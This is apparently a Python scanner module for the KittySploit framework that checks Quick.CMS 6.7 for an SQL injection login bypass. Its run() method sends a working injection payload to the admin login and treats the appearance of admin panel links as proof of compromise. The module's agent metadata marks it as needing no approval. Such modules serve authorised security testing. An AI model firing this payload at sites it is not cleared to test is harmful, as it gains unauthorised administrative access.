#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Quick."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Quick.CMS v6.7 - SQL Injection Detection',
        'description': 'Quick.CMS version 6.7 suffers from a remote SQL injection vulnerability that allows for authentication bypass.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'packetstorm', 'quickcms', 'sqli', 'cms', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/177657/Quick.CMS-6.7-SQL-Injection.html',
            'https://www.exploit-db.com/exploits/51910',
        ],
    }

    def run(self):
        path = '/admin.php?p=login'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='sEmail=test%40test.net&sPass=%27+or+1%5D%2500&bAcceptLicense=1&iAcceptLicense=true\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Log out</a>', 'Settings</a>', 'Plugins</a>',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Quick.CMS v6.7 - SQL Injection detected', path=path)
            return True
        return False

